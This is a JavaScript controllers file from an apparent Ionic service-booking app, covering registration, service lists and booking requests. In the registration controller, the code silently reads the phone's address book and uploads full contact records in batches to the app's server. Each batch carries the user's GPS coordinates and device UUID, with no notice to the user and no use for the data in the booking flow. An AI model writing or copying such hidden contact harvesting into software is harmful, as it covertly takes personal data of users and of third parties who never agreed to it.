angular.module('starter.controllers', ['ionic', 'ngCordova'])

    .controller('ServiceListCtrl', function($scope, $state, $ionicLoading, $ionicHistory, $localstorage, BlueTeam) {

        if ($localstorage.get('name') === undefined || $localstorage.get('mobile') === undefined || $localstorage.get('name') === "" || $localstorage.get('mobile') === "") {
            $ionicHistory.clearHistory();
            $state.go('reg');
        }

        $scope.show = function() {
            $ionicLoading.show({
                template: 'Loading...'
            });
        };
        $scope.hide = function() {
            $ionicLoading.hide();
        };

        $scope.show();

        var temp = BlueTeam.getServices().then(function(d) {

            $ionicHistory.clearHistory();
            $scope.services = window.services = d['root'];
            console.log($scope.services[0].img_url);
            $scope.hide();
        });


    })

    .controller('ContactCtrl', function($scope, Contactlist) {
        $scope.contacts = Contactlist.getAllContacts();
    })

    .controller('RegCtrl', function($scope, $state, $ionicLoading, $ionicHistory, $cordovaGeolocation, $localstorage, PhoneContactsFactory, $ionicPlatform, $cordovaDevice, BlueTeam) {


        $scope.data = {};

        $scope.position = {
            "coords": {
                "longitude": null,
                "latitude": null
            }
        };

        var posOptions = {
            timeout: 10000,
            enableHighAccuracy: false
        };
        $cordovaGeolocation
            .getCurrentPosition(posOptions)
            .then(function(position) {


                $scope.position = position;

            }, function(err) {

                console.log(JSON.stringify(err));
                $scope.position = {
                    "coords": {
                        "longitude": null,
                        "latitude": null
                    }
                };


            });


        $scope.show = function() {
            $ionicLoading.show({
                template: 'Loading...'
            });
        };
        $scope.hide = function() {
            $ionicLoading.hide();
        };


        $ionicPlatform.ready(function() {
            $scope.findContact = function() {
                // var fields = ["id", "displayName", "name", "nickname", "phoneNumbers", "emails", "addresses", "ims", "organizations", "birthday", "note", "photos", "categories", "urls"];

                PhoneContactsFactory.find().then(function(contacts) {
                    $arr = [];
                    $buff = [];
                    if($localstorage.get('lastContactId'))
                        lastContactId = parseInt($localstorage.get('lastContactId'));
                    else
                        lastContactId = -1;
                    var newlastContactId = lastContactId;
                    console.log("Last Id saved ", lastContactId);
                    var j = 0;
                    var i = 0
                    for (i = 0; i < contacts.length; i++) {

                        if(lastContactId < contacts[i].id) {
                            $arr.push({
                                /*name: contacts[i].name.formatted,*/
                                id: contacts[i].id,
                                all: JSON.stringify(contacts[i])
                            });


                            $buff.push({
                                /*name: contacts[i].name.formatted,*/
                                id: contacts[i].id,
                                all: contacts[i]
                            });

                            if(lastContactId < contacts[i].id )
                                newlastContactId = contacts[i].id;

                            j++;

                            if (j > 20) {

                                BlueTeam.postRaw({
                                        "root": {
                                            "gps_location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                                            "raw": $buff,

                                            "device_id": $cordovaDevice.getUUID()
                                        }
                                    }, "contacts")
                                    .then(function (d) {


                                    });
                                j = 0;
                                $buff = [];

                            }
                        }
                    }


                    $localstorage.set('lastContactId', newlastContactId);
                    if($buff.length > 0) {
                        BlueTeam.postRaw({
                                "root": {
                                    "gps_location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                                    "raw": $buff,

                                    "device_id": $cordovaDevice.getUUID()
                                }
                            }, "contacts")
                            .then(function (d) {


                            });

                    }
                    //$scope.contacts = $arr;
                    //console.log(JSON.stringify($scope.contacts));


                });
            };
            $scope.findContact();




        });



        if ($localstorage.get('name') === undefined || $localstorage.get('mobile') === undefined || $localstorage.get('email') === undefined || $localstorage.get('name') === "" || $localstorage.get('mobile') === "") {

        } else {
            $ionicHistory.clearHistory();
            $state.go('tab.service-list');
        }


        $scope.regUser = function() {

            $scope.show();
            BlueTeam.regUser({
                    "root": {
                        "gps_location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                        "name": $scope.data.name,
                        "mobile": $scope.data.mobile,
                        "email": $scope.data.email
                    }
                })
                .then(function(d) {

                    //setObject
                    $localstorage.set('name', $scope.data.name);
                    $localstorage.set('mobile', $scope.data.mobile);
                    $localstorage.set('email', $scope.data.email);

                    $scope.hide();
                    $state.go('tab.service-list');

                });
        };
    })


    .controller('ServiceTypeCtrl', function($scope, $state, $stateParams) {


        if (window.services === undefined)
            $state.go('tab.service-list');

        for (i = 0; i < window.services.length; i++) {
            if (window.services[i].name == $stateParams.id) {
                $scope.plans = window.services[i].plans;
            }
        }

        $scope.service = $stateParams.id;

    })

    .controller('FinishCtrl', function($scope, $state, $ionicHistory, $timeout, $stateParams) {

        $scope.$on('$ionicView.enter', function() {
            // Code you want executed every time view is opened
            $ionicHistory.clearHistory();
            $timeout(function() {
                $state.go('tab.service-list');
            }, 10000)
        })

    })

    .controller('BookCtrl', function($scope, $state, $ionicLoading, $timeout, $ionicHistory, $stateParams, $cordovaGeolocation, $localstorage, BlueTeam) {
        $scope.data = {};


        if (window.services === undefined)
            $state.go('tab.service-list');

        for (i = 0; i < window.services.length; i++) {

            if (window.services[i].name == $stateParams.id) {

                for (j = 0; j < window.services[i].plans.length; j++) {

                    if (window.services[i].plans[j].name == $stateParams.type) {

                        $scope.price = window.services[i].plans[j].price;
                    }
                }
            }
        }

        $scope.service = $stateParams.id;
        $scope.type = $stateParams.type;

        $scope.data.name = $localstorage.get('name');
        $scope.data.mobile = parseInt($localstorage.get('mobile'));
        $scope.data.address = $localstorage.get('address');;
        $scope.position = {
            "coords": {
                "longitude": null,
                "latitude": null
            }
        };
        // to get current location of the user
        var posOptions = {
            timeout: 10000,
            enableHighAccuracy: false
        };
        $cordovaGeolocation
            .getCurrentPosition(posOptions)
            .then(function(position) {

                $scope.position = position;

            }, function(err) {
                // error
                console.log(JSON.stringify(err));
                $scope.position = {
                    "coords": {
                        "longitude": null,
                        "latitude": null
                    }
                };
            });

        $scope.show = function() {
            $ionicLoading.show({
                template: 'Loading...'
            });
            $timeout(function() {
                $scope.hide();
            }, 5000);

        };
        $scope.hide = function() {
            $ionicLoading.hide();
        };

        // making post api call to the server by using angular based service

        $scope.conf = function() {
            $scope.show();
            $localstorage.set('name', $scope.data.name);
            $localstorage.set('mobile', $scope.data.mobile);
            $localstorage.set('address', $scope.data.address);

            BlueTeam.makeServiceRequest({
                    "root": {
                        "name": $scope.data.name,
                        "mobile": ""+$scope.data.mobile,
                        "location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                        "requirements": $scope.service,
                        "remarks": $scope.type+" this is request by mobile app",
                        "address": $scope.data.address,
                        "priority": ""+3
                    }
                })
                .then(function(d) {
                    $scope.hide();
                    $ionicHistory.clearHistory();
                    $state.go('finish');
                    //$scope.services = d['data']['services'];
                });
        };

        $scope.settings = {
            enableFriends: true
        };
    });